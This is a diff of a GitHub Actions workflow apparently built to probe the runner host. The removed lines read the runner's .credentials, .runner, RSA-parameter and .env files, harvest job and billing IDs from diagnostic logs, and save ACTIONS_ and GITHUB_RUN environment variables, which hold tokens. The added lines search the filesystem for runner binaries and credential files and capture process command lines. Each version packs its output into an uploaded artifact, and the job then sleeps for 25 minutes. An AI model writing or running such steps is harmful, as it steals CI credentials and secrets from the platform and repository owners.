@@ -7,33 +7,26 @@ jobs:
     steps:
       - name: mk
         run: mkdir -p out
-      - name: dump-runner-internals
+      - name: locate
         run: |
           set +e
-          RD=$(ls -d /home/runner/runners/* 2>/dev/null | head -1)
-          echo "RUNNER_DIR=$RD" > out/info.txt
-          ls -la /home/runner/runners/ >> out/info.txt 2>&1
-          ls -la "$RD" >> out/info.txt 2>&1
-          ls -la "$RD/_diag" >> out/info.txt 2>&1
-          for f in .credentials .runner .credentials_rsaparams .env; do
-            echo "===== $f" >> out/info.txt
-            cat "$RD/$f" >> out/info.txt 2>&1
+          { echo "== whoami: $(whoami)  home=$HOME";
+            echo "== ls /home/runner"; ls -la /home/runner 2>&1;
+            echo "== ls /opt"; ls -la /opt 2>&1;
+            echo "== ps"; ps auxww 2>&1 | grep -iE 'runner|worker|listener' ;
+            echo "== find Runner bits"; find / -xdev \( -name 'Runner.Listener*' -o -name 'Runner.Worker*' -o -name '.credentials' -o -name '.runner' \) 2>/dev/null | head -40;
+            echo "== find _diag"; find / -xdev -type d -name '_diag' 2>/dev/null | head -10;
+            echo "== RUNNER env"; env | grep -iE '^RUNNER|^AGENT' ;
+          } > out/locate.txt 2>&1
+          for p in $(pgrep -f 'Runner\.' 2>/dev/null); do
+            echo "=== pid $p" >> out/locate.txt
+            tr '\0' ' ' < /proc/$p/cmdline >> out/locate.txt 2>&1; echo >> out/locate.txt
+            echo "--- cwd: $(readlink /proc/$p/cwd 2>&1)" >> out/locate.txt
           done
-          mkdir -p out/diag
-          cp "$RD"/_diag/*.log out/diag/ 2>/dev/null
-          grep -rhoiE '"?(jobMessageId|messageId|message_id|planId|jobId|billingOwnerId)"?[": =]+[0-9a-fA-F-]{36}' "$RD"/_diag/ 2>/dev/null | sort -u > out/ids.txt
-          wc -l out/ids.txt >> out/info.txt
-          echo "---- ids ----" >> out/info.txt
-          cat out/ids.txt >> out/info.txt
-      - uses: actions/github-script@v7
-        with:
-          script: |
-            const fs=require('fs'); const keep={};
-            for (const [k,v] of Object.entries(process.env)) if (k.startsWith('ACTIONS_')||k.startsWith('GITHUB_RUN')) keep[k]=v;
-            fs.writeFileSync('out/env.json', JSON.stringify(keep,null,1));
+          wc -c out/locate.txt
       - uses: actions/upload-artifact@v4
         with:
-          name: runnerdump
+          name: locatedump
           path: out/
       - name: hold
         run: sleep 1500
